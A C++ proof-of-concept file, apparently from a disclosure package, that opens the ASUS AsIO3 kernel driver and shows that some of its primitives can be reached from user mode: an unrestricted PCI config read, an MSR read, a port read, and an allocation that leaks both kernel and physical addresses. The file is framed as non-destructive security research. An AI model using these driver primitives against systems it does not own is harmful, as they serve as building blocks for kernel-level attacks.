// poc_asio3.cpp - non-destructive proof of AsIO3 primitives.
//
// three read-only checks:
//   1. pci config read (0xa0400f70) - vendor/device of the host bridge,
//      no allowlist on this path. cross-check against
//      HKLM\SYSTEM\CurrentControlSet\Enum\PCI if you want.
//   2. rdmsr 0xCE (MSR_PLATFORM_INFO, allowlisted) - reserved/locked bits sane.
//   3. port read of 0x80 (POST diag port, allowlisted, side-effect free) and
//      a contiguous alloc to show the phys address oracle.
//
// needs admin + Asusgio3 running (any ASUS board with Armoury Crate):
//   sc query asComDrv       // service name varies by install
//   poc.exe
//
// part of the disclosure package in ANALYSIS.md. own hardware only.

#include <cstdio>
#include "asio3.h"

int main() {
    AsIO3Driver drv;
    if (!drv.open()) {
        wprintf(L"open \\\\.\\Asusgio3 failed, GLE=%lu (admin? driver running?)\n",
                GetLastError());
        return 1;
    }
    wprintf(L"[+] device opened\n");

    // 1. pci config - host bridge id
    uint32_t vid_did = drv.pci_read(0, 0, 0, 0x00);
    wprintf(L"[+] pci bus0 dev0 fn0 reg0 = %04X:%04X  (vendor:device of host bridge)\n",
            vid_did & 0xFFFF, vid_did >> 16);
    if ((vid_did & 0xFFFF) != 0xFFFF && vid_did != 0)
        wprintf(L"[+] ungated pci config read works\n");
    else
        wprintf(L"[-] pci read refused/empty\n");

    // 2. allowlisted msr
    uint64_t platform = 0;
    if (drv.rdmsr(0xCE, platform))
        wprintf(L"[+] rdmsr 0xCE (PLATFORM_INFO) = %016llX\n", platform);
    else
        wprintf(L"[-] rdmsr refused\n");

    // 3. port read + contiguous alloc oracle
    uint8_t post = 0;
    if (drv.inb(0x80, post))
        wprintf(L"[+] port 0x80 = %02X (allowlisted port read ok)\n", post);
    uint64_t phys = 0, kva = 0;
    if (drv.alloc_contiguous(0x1000, phys, kva))
        wprintf(L"[+] contiguous alloc: kva=%016llX phys=%016llX (phys oracle)\n",
                kva, phys);

    return 0;
}
